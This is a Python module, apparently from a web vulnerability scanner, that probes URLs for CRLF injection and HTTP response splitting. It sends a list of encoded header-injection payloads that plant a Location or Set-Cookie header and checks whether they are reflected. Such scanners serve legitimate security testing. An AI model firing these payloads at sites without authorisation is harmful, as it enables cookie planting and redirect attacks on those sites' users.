from core.others import good,bad,info,requester,proxies,requests,multitest
RedirectCodes = [i for i in range(300,311,1)]
from urllib.parse import unquote
payloads = [
            "%0d%0aLocation:www.google.com%0d%0a",
            "%0d%0aSet-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            "%E5%98%8A%E5%98%8DLocation:www.google.com",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            "%u000ASet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            "%23%0D%0ALocation:www.google.com;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            "%5cr%5cnLocation:www.google.com",
            "%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
            r"\r\n Header-Test:BLATRUC",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;"
            ]
#---------------------------------------------------------------------#
def CrlfScan(url,Foxy):
    result = multitest(url,payloads)
    if type(result) is tuple:
        MultipleParams(result[0],result[1],Foxy)
    else:
        NoParams(result,Foxy)

def MultipleParams(ParamList,Uri,Foxy):
    PayloadIndex = 0

    print("%s Checking for CRLF Injection" % info)
    for params in ParamList:
        try: 
            page = requester(Uri,Foxy,params)
            func_break = BasicChecks(page,payloads[PayloadIndex],unquote(page.request.url))
            if func_break:
                break
        except requests.exceptions.Timeout:
            print("[\033[91mTimeout\033[00m] %s" % url)
            break
        except requests.exceptions.ConnectionError:
            print("%s Connection Error" % bad)
            break
        except requests.exceptions.InvalidURL:
            print("%s Invalid URL structure" % bad)
            break
        except KeyError:
            PayloadIndex = 0

def NoParams(Uris,Foxy):
    PayloadIndex = 0

    for url in Uris:
        try: 
            page = requester(url,Foxy)
            func_break = BasicChecks(page,payloads[PayloadIndex],url)
            if func_break:
                break
        except requests.exceptions.Timeout:
            print("[\033[91mTimeout\033[00m] %s" % url)
            break

        except requests.exceptions.ConnectionError:
            print("%s Connection Error" % bad)
            break

        except requests.exceptions.InvalidURL:
            print("%s Invalid URL structure" % bad)
            break

        except KeyError:
            PayloadIndex = 0


def BasicChecks(PageVar,payload,url):
    skip = 1
    if 'Location' in payload and PageVar.status_code in RedirectCodes and PageVar.headers['Location'] == "www.google.com":
        print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
    elif "Set-Cookie" in payload:
        if PageVar.status_code != 404:
            try:
                if PageVar.headers['Set-Cookie'] == "name=ch33ms;":
                    print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))
            except KeyError:
                return skip

    if PageVar.status_code==404:
        print("%s %s [\033[91m404\033[00m]" % (bad,url))
        
    elif PageVar.status_code==403:
        print("%s %s [\033[91m403\033[00m]" % (bad,url))
        
    elif PageVar.status_code==400:
        print("%s %s [\033[91m400\033[00m]" % (bad,url))

    else:
        print("%s Found nothing :: %s" % (bad,url))